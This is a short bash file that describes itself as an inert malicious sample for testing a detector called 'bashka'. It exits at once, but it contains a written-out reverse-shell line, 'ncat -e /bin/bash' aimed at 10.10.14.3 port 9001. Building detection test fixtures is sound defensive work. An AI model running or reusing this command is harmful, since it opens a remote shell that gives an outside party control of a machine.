#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
ncat -e /bin/bash 10.10.14.3 9001
